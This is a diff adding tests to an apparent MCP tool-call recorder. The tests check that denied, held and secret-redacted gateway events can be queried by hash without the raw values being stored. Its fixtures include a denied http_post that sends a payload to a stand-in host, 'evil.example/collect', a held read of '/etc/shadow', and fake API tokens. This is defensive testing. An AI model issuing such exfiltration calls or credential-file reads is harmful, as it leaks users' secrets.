@@ -2,7 +2,7 @@ import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import { mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { GENESIS_HASH, makeRecord, sha256Ref } from '../src/chain/hash.js';
+import { GENESIS_HASH, canonicalJson, makeRecord, sha256Ref } from '../src/chain/hash.js';
 import { openStore } from '../src/store/index.js';
 import { Redactor } from '../src/redact/redactor.js';
 import { queryStore } from '../src/query/touched.js';
@@ -11,6 +11,7 @@ import type {
   AnyEvent,
   ChainRecord,
   IdentityContext,
+  PolicyDecisionEvent,
   ServerContext,
   SessionEndEvent,
   SessionStartEvent,
@@ -343,5 +344,319 @@ describe('queryStore finds needles hashed as KEYS or embedded via secret_refs', 
       matched_on: 'ref',
     });
     expect(result.matches[0]!.path).toContain('secret_refs');
+  });
+});
+
+/* ------------------------- gateway mode (additive) -------------------------
+ * policy_decision events name their tool like tool_call does, and a secret
+ * the boundary filter scrubbed out of a result (recorded only as a hash in
+ * gateway.boundary.secret_refs) still traces back to the call.
+ */
+
+describe('queryStore — gateway-mode events (policy_decision, boundary secret_refs)', () => {
+  const SESSION_D = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
+  const BOUNDARY_SECRET = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345';
+  const LONG_TOOL = 'x'.repeat(200); // over the structuralString cap -> stored as its sha256 ref
+  const DENIED_ARGS = { url: 'https://evil.example/collect', body: 'payload-7f3e' };
+
+  let dir: string;
+  let store: EvidenceStore;
+
+  function policyDecision(timestamp: string, over: Partial<PolicyDecisionEvent>): PolicyDecisionEvent {
+    return {
+      schema: SCHEMA,
+      event_id: fakeUuid(),
+      session_id: SESSION_D,
+      timestamp,
+      kind: 'policy_decision',
+      identity: IDENTITY,
+      server: SERVER,
+      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny' },
+      decision: 'deny',
+      tool: 'http_post',
+      request_id: 4,
+      policy_hash: sha256Ref('policy bytes'),
+      args_hash: sha256Ref(JSON.stringify({ body: DENIED_ARGS.body, url: DENIED_ARGS.url })),
+      ...over,
+    };
+  }
+
+  beforeAll(() => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-gw-'));
+    store = openStore({ dataDir: dir, backend: 'sqlite' });
+    const redactor = new Redactor();
+    // The delivered/recorded result no longer contains the secret; only the
+    // boundary report's secret_refs does.
+    const filtered: ToolCallEvent = {
+      ...toolCall(SESSION_D, '2026-06-13T09:00:02.000Z', 'read_file', { path: 'secrets.env' }),
+      result: redactor.scrub({ content: [{ type: 'text', text: 'KEY=[redacted:sha256:0123456789abcdef]' }] }),
+      gateway: {
+        decision: 'allow',
+        boundary: { scanned: true, action: 'redact', secrets_found: 1, injection_found: 0, secret_refs: [sha256Ref(BOUNDARY_SECRET)] },
+      },
+    };
+    store.append(
+      seal([
+        sessionStart(SESSION_D, '2026-06-13T09:00:00.000Z', IDENTITY),
+        policyDecision('2026-06-13T09:00:01.000Z', {}),
+        filtered,
+        policyDecision('2026-06-13T09:00:03.000Z', { tool: sha256Ref(LONG_TOOL), request_id: 5 }),
+        sessionEnd(SESSION_D, '2026-06-13T09:00:04.000Z'),
+      ]),
+    );
+  });
+
+  afterAll(() => {
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('a policy_decision matches its tool by name, and carries `name` like a tool_call', () => {
+    const result = queryStore(store, 'HTTP_POST');
+    const decision = result.matches.find((m) => m.kind === 'policy_decision');
+    expect(decision).toMatchObject({ seq: 2, session_id: SESSION_D, name: 'http_post', matched_on: 'name', path: '$.tool' });
+  });
+
+  it('a secret redacted at the boundary is found via gateway.boundary.secret_refs', () => {
+    const result = queryStore(store, BOUNDARY_SECRET);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({
+      seq: 3,
+      kind: 'tool_call',
+      name: 'read_file',
+      matched_on: 'ref',
+      path: '$.gateway.boundary.secret_refs[0]',
+    });
+    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_D]);
+  });
+
+  it('an over-long tool name capped to its hash on a policy_decision is still found via $.tool', () => {
+    const result = queryStore(store, LONG_TOOL);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({ seq: 4, kind: 'policy_decision', matched_on: 'ref', path: '$.tool' });
+  });
+
+  it('the args_hash of a denied call is a plain hash, not a ref leaf: the raw args are not findable through it', () => {
+    // No readable payload and no RedactedRef for the arguments live on a
+    // policy_decision — the tool_call (with scrubbed args) is where a raw
+    // argument traces. This pins that the new kind adds nothing readable.
+    const result = queryStore(store, DENIED_ARGS.body);
+    expect(result.matches.filter((m) => m.kind === 'policy_decision')).toHaveLength(0);
+    expect(JSON.stringify([...store.iterate()])).not.toContain(DENIED_ARGS.body);
+  });
+});
+
+/* ---------------- gateway events (package A: additive kind/fields) --------------- */
+
+describe('queryStore over gateway-mode events (policy_decision kind, tool_call.gateway fields)', () => {
+  const LEAKED = 'AKIAIOSFODNN7EXAMPLE';
+  const SESSION_G = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee';
+  const POLICY_HASH = sha256Ref('policy bytes');
+
+  let dir: string;
+  let store: EvidenceStore;
+
+  beforeAll(() => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-gateway-'));
+    store = openStore({ dataDir: dir, backend: 'jsonl' });
+    const start = sessionStart(SESSION_G, '2026-06-13T09:00:00.000Z', IDENTITY);
+    start.policy = { hash: POLICY_HASH, name: 'laptop' };
+    // The boundary filter redacted LEAKED before the model saw it; the RAW
+    // result (what the store records) still carries it, hashed by the
+    // redactor with a secret_ref, so a blast-radius query finds the call.
+    const redactor = new Redactor();
+    const rawResult = { content: [{ type: 'text', text: `key=${LEAKED} rest` }] };
+    const allowed = toolCall(SESSION_G, '2026-06-13T09:00:01.000Z', 'read_file', { path: '/tmp/creds' });
+    allowed.result = redactor.scrub(rawResult);
+    allowed.result_hash = sha256Ref(JSON.stringify(rawResult));
+    allowed.gateway = {
+      decision: 'allow',
+      boundary: { scanned: true, action: 'redact', secrets_found: 1, injection_found: 0, secret_refs: [sha256Ref(LEAKED)], delivered_result_hash: sha256Ref('delivered') },
+    };
+    const decision: PolicyDecisionEvent = {
+      schema: SCHEMA,
+      event_id: fakeUuid(),
+      session_id: SESSION_G,
+      timestamp: '2026-06-13T09:00:02.000Z',
+      kind: 'policy_decision',
+      identity: IDENTITY,
+      server: SERVER,
+      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny', 'cresec.policy.rule_id': 'no-exfil' },
+      decision: 'deny',
+      tool: 'http_post',
+      request_id: 2,
+      rule_id: 'no-exfil',
+      policy_hash: POLICY_HASH,
+      args_hash: sha256Ref('{"url":"https://evil.example"}'),
+    };
+    const denied = toolCall(SESSION_G, '2026-06-13T09:00:02.001Z', 'http_post', { url: 'https://evil.example', body: SECRET });
+    denied.is_error = true;
+    denied.error = { type: 'policy_denied' };
+    denied.gateway = { decision: 'deny', rule_id: 'no-exfil' };
+    store.append(seal([start, allowed, decision, denied, sessionEnd(SESSION_G, '2026-06-13T09:00:03.000Z')]));
+  });
+
+  afterAll(() => {
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('finds a value the boundary filter redacted before the model saw it (via the raw result the store keeps)', () => {
+    const result = queryStore(store, LEAKED);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({ seq: 2, kind: 'tool_call', name: 'read_file', matched_on: 'ref' });
+    expect(result.matches[0]!.path).toContain('secret_refs');
+  });
+
+  it("finds a denied call's hashed arguments (the call never reached the server)", () => {
+    const result = queryStore(store, SECRET);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({ seq: 4, kind: 'tool_call', name: 'http_post', matched_on: 'ref' });
+    expect(result.matches[0]!.path).toBe('$.args.body');
+  });
+
+  it('a tool-name query lists the denied tool_call (and does not choke on the policy_decision kind)', () => {
+    const result = queryStore(store, 'http_post');
+    const kinds = result.matches.map((m) => m.kind);
+    expect(kinds).toContain('tool_call');
+    expect(result.matches.find((m) => m.kind === 'tool_call')).toMatchObject({ seq: 4, name: 'http_post', matched_on: 'name' });
+    // Nothing in the store reads back in clear.
+    expect(JSON.stringify([...store.iterate()])).not.toContain(LEAKED);
+    expect(JSON.stringify([...store.iterate()])).not.toContain(SECRET);
+  });
+
+  it('a needle that appears nowhere yields no matches, gateway events included', () => {
+    expect(queryStore(store, 'no-such-value-anywhere').matches).toEqual([]);
+  });
+});
+
+/* ------------------- policy_decision.args_hash (gateway mode) -------------------
+ * A denied or held call never reaches the server, so its arguments exist
+ * nowhere in the chain except as `args_hash` — sha256 of their canonical
+ * JSON — on the policy_decision. Querying those exact canonical arguments
+ * has to name the refused call (the replay page's client-side search
+ * already matches this field).
+ */
+
+describe('queryStore — policy_decision.args_hash', () => {
+  const SESSION_H = 'ffffffff-ffff-4fff-8fff-ffffffffffff';
+  const DENIED_ARGS = { url: 'https://evil.example/collect', body: 'payload-7f3e' };
+  const HELD_ARGS = { path: '/etc/shadow', mode: 'read' };
+  const DENIED_CANONICAL = canonicalJson(DENIED_ARGS);
+  const HELD_CANONICAL = canonicalJson(HELD_ARGS);
+
+  let dir: string;
+  let store: EvidenceStore;
+
+  function decision(
+    timestamp: string,
+    requestId: number,
+    tool: string,
+    argsHash: string,
+    over: Partial<PolicyDecisionEvent> = {},
+  ): PolicyDecisionEvent {
+    return {
+      schema: SCHEMA,
+      event_id: fakeUuid(),
+      session_id: SESSION_H,
+      timestamp,
+      kind: 'policy_decision',
+      identity: IDENTITY,
+      server: SERVER,
+      attributes: { 'gen_ai.tool.name': tool, 'cresec.policy.decision': 'deny' },
+      decision: 'deny',
+      tool,
+      request_id: requestId,
+      rule_id: 'no-exfil',
+      policy_hash: sha256Ref('policy bytes'),
+      args_hash: argsHash,
+      ...over,
+    };
+  }
+
+  beforeAll(() => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-args-'));
+    store = openStore({ dataDir: dir, backend: 'sqlite' });
+    store.append(
+      seal([
+        sessionStart(SESSION_H, '2026-06-14T08:00:00.000Z', IDENTITY),
+        decision('2026-06-14T08:00:01.000Z', 11, 'http_post', sha256Ref(DENIED_CANONICAL)),
+        decision('2026-06-14T08:00:02.000Z', 12, 'read_file', sha256Ref(HELD_CANONICAL), {
+          decision: 'hold',
+          outcome: 'timeout',
+          rule_id: 'needs-human',
+          approval_id: 'hold-1',
+          waited_ms: 30_000,
+        }),
+        toolCall(SESSION_H, '2026-06-14T08:00:03.000Z', 'list_dir', { path: '/tmp' }),
+        sessionEnd(SESSION_H, '2026-06-14T08:00:04.000Z'),
+      ]),
+    );
+  });
+
+  afterAll(() => {
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('finds the denied call from the exact canonical JSON of its arguments', () => {
+    const result = queryStore(store, DENIED_CANONICAL);
+    expect(result.needle_hash).toBe(sha256Ref(DENIED_CANONICAL));
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toEqual({
+      seq: 2,
+      session_id: SESSION_H,
+      timestamp: '2026-06-14T08:00:01.000Z',
+      kind: 'policy_decision',
+      name: 'http_post',
+      matched_on: 'args_hash',
+      path: '$.args_hash',
+    });
+  });
+
+  it('finds a HELD call the same way', () => {
+    const result = queryStore(store, HELD_CANONICAL);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({
+      seq: 3,
+      kind: 'policy_decision',
+      name: 'read_file',
+      matched_on: 'args_hash',
+      path: '$.args_hash',
+    });
+  });
+
+  it('lists the touched session and stays valid JSON output', () => {
+    const result = queryStore(store, DENIED_CANONICAL);
+    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_H]);
+    expect(JSON.parse(JSON.stringify(result))).toEqual(result);
+    expect(store.sessions().some((s) => s.session_id === SESSION_H)).toBe(true);
+  });
+
+  it('is exact: a different key order, a subset or a raw argument value does not match', () => {
+    for (const needle of [
+      JSON.stringify(DENIED_ARGS), // insertion order, not canonical order
+      canonicalJson({ url: DENIED_ARGS.url }),
+      DENIED_ARGS.body,
+      DENIED_ARGS.url,
+    ]) {
+      expect(queryStore(store, needle).matches.filter((m) => m.matched_on === 'args_hash')).toEqual([]);
+    }
+    // ...and the arguments themselves never read back in clear.
+    expect(JSON.stringify([...store.iterate()])).not.toContain(DENIED_ARGS.body);
+    expect(JSON.stringify([...store.iterate()])).not.toContain(HELD_ARGS.path);
+  });
+
+  it('a stronger location still wins on the same event', () => {
+    // The tool name of the denied call is a plain `name` match, which is
+    // WEAKER than args_hash; an args_hash hit must be the reported one.
+    const byName = queryStore(store, 'http_post');
+    expect(byName.matches.find((m) => m.kind === 'policy_decision')).toMatchObject({ matched_on: 'name' });
+    const byArgs = queryStore(store, DENIED_CANONICAL);
+    expect(byArgs.matches[0]!.matched_on).toBe('args_hash');
+  });
+
+  it('scoping to another session finds nothing', () => {
+    expect(queryStore(store, DENIED_CANONICAL, { sessionId: SESSION_A }).matches).toEqual([]);
   });
 });
